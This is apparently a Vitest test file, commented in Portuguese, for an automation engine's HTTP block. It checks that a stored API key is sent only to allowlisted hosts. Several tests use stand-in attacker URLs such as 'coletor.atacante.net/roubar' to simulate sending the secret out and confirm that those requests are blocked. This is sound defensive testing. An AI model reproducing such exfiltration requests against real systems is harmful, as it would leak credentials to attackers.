/**
 * A chave do cofre presa aos endereços permitidos (migration 1007).
 *
 * Achado da auditoria do lote 4: quem edita automação (e não vê o valor da
 * chave) montava um bloco "Requisição HTTP" para um servidor próprio, com a
 * chave no cabeçalho, e recebia o token. Aqui:
 *   1. a regra pura (`hosts-permitidos.ts`): forma, normalização, comparação;
 *   2. o MOTOR (`executarHttp` inteiro): host fora da lista sai por "Falhou"
 *      sem chamar a rede — chave no cabeçalho e no corpo; chave antiga (lista
 *      nula) segue indo; e, no fim, o fetch seguro de PRODUÇÃO contra um
 *      receptor HTTP real: o host permitido recebe, o outro recebe zero;
 *   3. o publish recusa o bloco cujo host não bate com a chave;
 *   4. o histórico diz qual chave e para onde ela pode ir.
 * Dublês: o banco (o cofre devolve a chave "decifrada") e, no bloco do
 * receptor real, só o DNS e o TLS.
 */
import * as http from "node:http";
import type { AddressInfo } from "node:net";

import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";

import { criarFetchSeguro, type RequisicaoHttps } from "@/lib/ai/mcp-externo/fetch-seguro";
import type { HandlerCtx } from "@/lib/api/handlers/types";
import { descreveEvento } from "@/lib/followup/eventos-legiveis";
import { flowGraphSchema, type FlowGraph } from "@/lib/followup/graph-schema";
import { validateFlowForPublish } from "@/lib/followup/validate-publish";

import { executarHttp, type NoHttp } from "./efeitos/http";
import type { Contexto, Passo } from "./efeitos/index";
import type { FatosDaAutomacao } from "./fatos";
import {
  ampliaOsHosts,
  fraseDaChavePresa,
  hostDaUrlDoBloco,
  hostPermitido,
  hostsPermitidosSchema,
  lerHost,
  normalizarHost,
} from "./hosts-permitidos";
import type { HttpRequestConfig } from "./http";

const ORG = "aaaaaaaa-0000-4000-8000-000000000001";
const CHAVE_ID = "aaaaaaaa-1111-4000-8000-000000000001";
const TOKEN = "tok_SUPERSECRETO_123456";

// ─── 1. A regra pura ───────────────────────────────────────────────────────

describe("forma do endereço permitido", () => {
  it("aceita o nome do servidor e o normaliza (minúsculas, sem ponto final)", () => {
    expect(normalizarHost("api.servico.com.br")).toBe("api.servico.com.br");
    expect(normalizarHost("  API.Exemplo.COM.br ")).toBe("api.exemplo.com.br");
    expect(normalizarHost("api.exemplo.com.")).toBe("api.exemplo.com");
  });
  it("nome internacional vira punycode, a mesma forma da URL do bloco", () => {
    const h = normalizarHost("ação.com.br");
    expect(h).toMatch(/^xn--/);
    expect(h).toBe(new URL("https://ação.com.br/x").hostname);
    expect(normalizarHost("AÇÃO.com.br")).toBe(h);
  });
  it.each([
    ["https://api.exemplo.com", "com_esquema"],
    ["api.exemplo.com/v1", "com_caminho"],
    ["api.exemplo.com:443", "com_porta"],
    ["user@api.exemplo.com", "com_usuario"],
    ["*.exemplo.com", "curinga"],
    ["*", "curinga"],
    ["localhost", "invalido"],
    ["exemplo", "invalido"],
    ["api..exemplo.com", "invalido"],
    ["-api.exemplo.com", "invalido"],
    ["api exemplo.com", "invalido"],
    ["", "vazio"],
  ])("recusa %j (%s)", (entrada, problema) => {
    expect(lerHost(entrada)).toEqual({ problema });
  });
  it("a lista: normalizada, sem repetição, 1 a 10", () => {
    expect(hostsPermitidosSchema.parse(["A.com.br", "a.com.br", "b.com"])).toEqual([
      "a.com.br",
      "b.com",
    ]);
    expect(hostsPermitidosSchema.safeParse([]).success).toBe(false);
    expect(hostsPermitidosSchema.safeParse(["https://a.com"]).success).toBe(false);
    expect(
      hostsPermitidosSchema.safeParse(Array.from({ length: 11 }, (_, i) => `h${i}.com`)).success,
    ).toBe(false);
  });
});

describe("comparação do host", () => {
  const lista = ["api.exemplo.com"];
  it("exato passa; maiúsculas e ponto final do destino não mudam nada", () => {
    expect(hostPermitido("api.exemplo.com", lista)).toBe(true);
    expect(hostPermitido("API.EXEMPLO.COM", lista)).toBe(true);
    expect(hostPermitido("api.exemplo.com.", lista)).toBe(true);
  });
  it("porta não entra na comparação (o host da URL vem sem ela)", () => {
    expect(hostPermitido(new URL("https://api.exemplo.com:8443/x").hostname, lista)).toBe(true);
  });
  it("subdomínio e domínio-pai NÃO passam: sem curinga", () => {
    expect(hostPermitido("x.api.exemplo.com", lista)).toBe(false);
    expect(hostPermitido("exemplo.com", lista)).toBe(false);
    expect(hostPermitido("api.exemplo.com.atacante.net", lista)).toBe(false);
    expect(hostPermitido("evilapi.exemplo.com", lista)).toBe(false);
  });
  it("item escrito como curinga na lista não vira curinga", () => {
    expect(hostPermitido("a.exemplo.com", ["*.exemplo.com"])).toBe(false);
  });
  it("punycode: o host da URL internacional bate com o item escrito com acento", () => {
    expect(hostPermitido(new URL("https://ação.com.br/").hostname, ["ação.com.br"])).toBe(true);
    // E o homógrafo (a com acento ≠ a) não bate.
    expect(hostPermitido(new URL("https://acão.com.br/").hostname, ["ação.com.br"])).toBe(false);
  });
  it("lista nula (chave antiga) vai para qualquer host; lista vazia, para nenhum", () => {
    expect(hostPermitido("qualquer.coisa.net", null)).toBe(true);
    expect(hostPermitido("api.exemplo.com", [])).toBe(false);
  });
  it("o host do bloco sai da URL com variável no caminho", () => {
    expect(hostDaUrlDoBloco("https://API.exemplo.com:8443/v1/{{campo.x}}?a={{b}}")).toBe(
      "api.exemplo.com",
    );
    expect(hostDaUrlDoBloco("https://")).toBeNull();
  });
  it("ampliar a lista é pôr endereço que ela não tinha; preencher a lista nula não amplia", () => {
    expect(ampliaOsHosts(["a.com"], ["a.com", "b.com"])).toBe(true);
    expect(ampliaOsHosts(["a.com", "b.com"], ["a.com"])).toBe(false);
    expect(ampliaOsHosts(null, ["qualquer.com"])).toBe(false);
  });
  it("a frase diz a chave e a lista", () => {
    expect(fraseDaChavePresa("token_meta", ["api.servico.com.br"])).toBe(
      "A chave “token_meta” só pode ser enviada para api.servico.com.br.",
    );
    expect(fraseDaChavePresa("k", ["a.com", "b.com", "c.com"])).toBe(
      "A chave “k” só pode ser enviada para a.com, b.com ou c.com.",
    );
  });
});

// ─── 2. O motor ────────────────────────────────────────────────────────────

type Linha = {
  id: string;
  organization_id: string;
  nome: string;
  hosts_permitidos: string[] | null;
  valor_cifrado: string;
};

function bancoDuble(linhas: Linha[]) {
  return {
    from(tabela: string) {
      const filtros: Record<string, unknown> = {};
      let atualizacao = false;
      const q = {
        select: () => q,
        update: () => ((atualizacao = true), q),
        eq: (c: string, v: unknown) => ((filtros[c] = v), q),
        in: (_c: string, ids: string[]) => {
          if (atualizacao) return Promise.resolve({ data: null, error: null });
          const data =
            tabela === "automacao_segredos"
              ? linhas.filter(
                  (l) => l.organization_id === filtros.organization_id && ids.includes(l.id),
                )
              : [];
          return Promise.resolve({ data, error: null });
        },
      };
      return q;
    },
    rpc: async (nome: string, args: { ciphertext: string }) =>
      nome === "fn_decrypt_oauth" && args.ciphertext === "\\xcifrado"
        ? { data: TOKEN, error: null }
        : { data: null, error: { message: "x" } },
  };
}

function chave(hosts: string[] | null): Linha[] {
  return [
    {
      id: CHAVE_ID,
      organization_id: ORG,
      nome: "token_meta",
      hosts_permitidos: hosts,
      valor_cifrado: "\\xcifrado",
    },
  ];
}

function contexto(
  admin: unknown,
  vars: Record<string, unknown> = { gatilho: { fonte: "x" } },
): Contexto {
  return {
    admin: admin as Contexto["admin"],
    org: ORG,
    pointerId: "p1",
    enrollmentId: "e1",
    chave: "h:1",
    contatoId: "c1",
    fatos: { contato: null, negocio: null, negocios: [], vars } as unknown as FatosDaAutomacao,
    vars,
    handler: {} as HandlerCtx,
    agora: new Date("2026-11-11T12:00:00Z"),
  };
}

function no(config: Partial<HttpRequestConfig>): NoHttp {
  return {
    id: "h",
    type: "http_request",
    label: "Chamar API",
    position: { x: 0, y: 0 },
    config: {
      method: "GET",
      url: "https://api.servico.com.br/v1/me",
      headers: [{ kind: "chave", name: "Authorization", secret_id: CHAVE_ID, prefix: "Bearer " }],
      timeout_ms: 10_000,
      mappings: [],
      ...config,
    },
  } as NoHttp;
}

const semCampos = async (): Promise<Passo> => ({ ok: true, detalhe: {} });
const semLimite = async () => ({ allowed: true });

function fetchQueConta() {
  const fetch = vi.fn(async () => new Response("{}", { status: 200 }));
  return fetch;
}

describe("motor: a chave só vai para os endereços permitidos", () => {
  it("host permitido: a chamada sai com a chave (controle)", async () => {
    const fetch = fetchQueConta();
    const r = await executarHttp(contexto(bancoDuble(chave(["api.servico.com.br"]))), no({}), {
      fetch,
      gravarCampos: semCampos,
      limitar: semLimite,
    });
    expect(r.desfecho).toEqual({ ok: true });
    expect(fetch).toHaveBeenCalledTimes(1);
  });

  it("host fora da lista, chave no CABEÇALHO: Falhou, nenhuma requisição sai", async () => {
    const fetch = fetchQueConta();
    const r = await executarHttp(
      contexto(bancoDuble(chave(["api.servico.com.br"]))),
      no({ url: "https://coletor.atacante.net/roubar" }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(r.desfecho).toEqual({ ok: false, erro: "http_host_nao_permitido" });
    expect(fetch).not.toHaveBeenCalled();
    expect(r.detalhes?.[0]).toMatchObject({
      tipo: "http_request",
      ok: false,
      host: "coletor.atacante.net",
      chave: "token_meta",
      permitidos: ["api.servico.com.br"],
    });
    expect(JSON.stringify(r)).not.toContain(TOKEN);
  });

  it("host fora da lista, chave no CORPO: Falhou, nenhuma requisição sai", async () => {
    const fetch = fetchQueConta();
    const r = await executarHttp(
      contexto(bancoDuble(chave(["api.servico.com.br"]))),
      no({
        method: "POST",
        url: "https://coletor.atacante.net/roubar",
        headers: [],
        body: '{"token": ""}',
        body_secrets: [{ path: "token", secret_id: CHAVE_ID, prefix: "" }],
      }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(r.desfecho).toEqual({ ok: false, erro: "http_host_nao_permitido" });
    expect(fetch).not.toHaveBeenCalled();
  });

  it("chave na QUERY não existe: `{{segredo...}}` na URL segue recusado antes de tudo", async () => {
    const fetch = fetchQueConta();
    const r = await executarHttp(
      contexto(bancoDuble(chave(["api.servico.com.br"]))),
      no({ url: "https://api.servico.com.br/v1/me?access_token={{segredo.token_meta}}" }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(r.desfecho).toEqual({ ok: false, erro: "http_segredo_na_url" });
    expect(fetch).not.toHaveBeenCalled();
  });

  it("maiúsculas e porta na URL do bloco não driblam nem travam a regra", async () => {
    const fetch = fetchQueConta();
    const ok = await executarHttp(
      contexto(bancoDuble(chave(["api.servico.com.br"]))),
      no({ url: "https://API.Servico.com.br:443/v1/me" }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(ok.desfecho).toEqual({ ok: true });
    const sub = await executarHttp(
      contexto(bancoDuble(chave(["servico.com.br"]))),
      no({ url: "https://api.servico.com.br/v1/me" }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(sub.desfecho).toEqual({ ok: false, erro: "http_host_nao_permitido" });
    expect(fetch).toHaveBeenCalledTimes(1);
  });

  it("host vindo de variável não chega a ser comparado: domínio com {{gatilho.fonte}} é recusado", async () => {
    const fetch = fetchQueConta();
    const r = await executarHttp(
      contexto(bancoDuble(chave(["api.servico.com.br"])), {
        gatilho: { fonte: "coletor.atacante.net" },
      }),
      no({ url: "https://{{gatilho.fonte}}/roubar" }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(r.desfecho.ok).toBe(false);
    expect(fetch).not.toHaveBeenCalled();
  });

  it("variável no CAMINHO é renderizada e o host comparado é o da URL final (permitido)", async () => {
    const fetch = vi.fn(
      async (_url: string | URL | Request) => new Response("{}", { status: 200 }),
    );
    const r = await executarHttp(
      contexto(bancoDuble(chave(["api.servico.com.br"])), {
        gatilho: { fonte: "@coletor.atacante.net" },
      }),
      no({ url: "https://api.servico.com.br/{{gatilho.fonte}}" }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(r.desfecho).toEqual({ ok: true });
    expect(new URL(String(fetch.mock.calls[0]![0])).hostname).toBe("api.servico.com.br");
  });

  it("chave ANTIGA (lista nula) segue indo para qualquer endereço: automação publicada não quebra", async () => {
    const fetch = fetchQueConta();
    const r = await executarHttp(
      contexto(bancoDuble(chave(null))),
      no({ url: "https://api.qualquer.com.br/x" }),
      { fetch, gravarCampos: semCampos, limitar: semLimite },
    );
    expect(r.desfecho).toEqual({ ok: true });
    expect(fetch).toHaveBeenCalledTimes(1);
  });

  it("o histórico diz qual chave e para onde ela pode ir, sem o token", async () => {
    const r = await executarHttp(
      contexto(bancoDuble(chave(["api.servico.com.br"]))),
      no({ url: "https://coletor.atacante.net/roubar" }),
      { fetch: fetchQueConta(), gravarCampos: semCampos, limitar: semLimite },
    );
    const lido = descreveEvento(
      {
        event_type: "effect_failed",
        node_id: "h",
        payload: { desfecho: r.desfecho, detalhes: r.detalhes },
        created_at: "2026-11-11T12:00:00Z",
      } as never,
      {},
      "pt-BR",
      "automacao",
    );
    const texto = `${lido.titulo} ${lido.detalhe ?? ""}`;
    expect(texto).toContain("A chave “token_meta” só pode ser enviada para api.servico.com.br.");
    expect(texto).toContain("coletor.atacante.net");
    expect(texto).not.toContain(TOKEN);
  });
});

describe("motor + fetch seguro de produção, contra um receptor HTTP real", () => {
  let servidor: http.Server;
  let porta = 0;
  const recebidas: Array<{ host: string | undefined; authorization: string | undefined }> = [];

  beforeAll(async () => {
    servidor = http.createServer((req, res) => {
      recebidas.push({ host: req.headers.host, authorization: req.headers.authorization });
      res.writeHead(200, { "content-type": "application/json" });
      res.end("{}");
    });
    await new Promise<void>((r) => servidor.listen(0, "127.0.0.1", r));
    porta = (servidor.address() as AddressInfo).port;
  });
  afterAll(async () => {
    await new Promise<void>((r) => servidor.close(() => r()));
  });

  // Só o DNS e o TLS trocados: todo nome "resolve" para o receptor local.
  function fetchDeProducao() {
    const requisitar = ((
      url: URL,
      opcoes: http.RequestOptions,
      cb: (res: http.IncomingMessage) => void,
    ) =>
      http.request(
        {
          ...opcoes,
          host: "127.0.0.1",
          port: porta,
          path: `${url.pathname}${url.search}`,
          protocol: "http:",
          headers: { ...(opcoes.headers as Record<string, string>), host: url.host },
        },
        cb,
      )) as unknown as RequisicaoHttps;
    return criarFetchSeguro({ resolverHost: async () => ["127.0.0.1"], requisitar });
  }

  it("o endereço permitido recebe a chave; o outro, com o mesmo bloco, recebe zero", async () => {
    const admin = bancoDuble(chave(["api.exemplo.com"]));
    const ok = await executarHttp(contexto(admin), no({ url: "https://api.exemplo.com/v1/x" }), {
      fetch: fetchDeProducao(),
      gravarCampos: semCampos,
      limitar: semLimite,
    });
    expect(ok.desfecho).toEqual({ ok: true });
    expect(recebidas).toEqual([{ host: "api.exemplo.com", authorization: `Bearer ${TOKEN}` }]);

    const recusa = await executarHttp(
      contexto(admin),
      no({ url: "https://outro.exemplo.net/v1/x" }),
      { fetch: fetchDeProducao(), gravarCampos: semCampos, limitar: semLimite },
    );
    expect(recusa.desfecho).toEqual({ ok: false, erro: "http_host_nao_permitido" });
    expect(recebidas).toHaveLength(1);
  });
});

// ─── 3. O publish ──────────────────────────────────────────────────────────

function grafo(config: HttpRequestConfig): FlowGraph {
  return flowGraphSchema.parse({
    nodes: [
      {
        id: "t",
        type: "trigger",
        label: "Início",
        position: { x: 0, y: 0 },
        config: {
          triggers: [{ kind: "manual" }],
          reentry: { policy: "skip_if_running", cooldown_minutes: 0 },
        },
      },
      { id: "h", type: "http_request", label: "Chamar API", position: { x: 0, y: 100 }, config },
      {
        id: "f",
        type: "end",
        label: "Fim",
        position: { x: 0, y: 200 },
        config: { outcome: "converted" },
      },
    ],
    edges: [
      { id: "e1", source: "t", target: "h", priority: 0, condition: { type: "always" } },
      { id: "e2", source: "h", target: "f", priority: 0, condition: { type: "always" } },
      {
        id: "e3",
        source: "h",
        target: "f",
        priority: 1,
        condition: { type: "branch", branch_id: "erro" },
      },
    ],
  });
}

function recusas(url: string, hosts: string[] | null, noCorpo = false) {
  const config: HttpRequestConfig = noCorpo
    ? {
        method: "POST",
        url,
        headers: [],
        body: '{"token": ""}',
        body_secrets: [{ path: "token", secret_id: CHAVE_ID, prefix: "" }],
        timeout_ms: 10_000,
        mappings: [],
      }
    : {
        method: "GET",
        url,
        headers: [{ kind: "chave", name: "Authorization", secret_id: CHAVE_ID, prefix: "Bearer " }],
        timeout_ms: 10_000,
        mappings: [],
      };
  const r = validateFlowForPublish(grafo(config), {
    surface: "automacao",
    automacao: {
      pointerId: "p",
      segredosExistentes: new Set([CHAVE_ID]),
      destinosDosSegredos: new Map([[CHAVE_ID, { nome: "token_meta", hosts_permitidos: hosts }]]),
    },
  });
  return r.ok ? [] : r.errors.filter((e) => e.code === "http_host_nao_permitido");
}

describe("publish: o host do bloco tem de estar na lista da chave", () => {
  it("bate: publica (controle)", () => {
    expect(recusas("https://api.servico.com.br/v1/{{campo.x}}", ["api.servico.com.br"])).toEqual(
      [],
    );
  });
  it("não bate (cabeçalho e corpo): recusa com a frase da chave e o endereço do bloco", () => {
    for (const noCorpo of [false, true]) {
      const r = recusas("https://coletor.atacante.net/x", ["api.servico.com.br"], noCorpo);
      expect(r).toHaveLength(1);
      expect(r[0]!.message).toContain(
        "A chave “token_meta” só pode ser enviada para api.servico.com.br.",
      );
      expect(r[0]!.message).toContain("coletor.atacante.net");
    }
  });
  it("chave antiga (lista nula) publica para qualquer host", () => {
    expect(recusas("https://api.qualquer.com.br/x", null)).toEqual([]);
  });
});
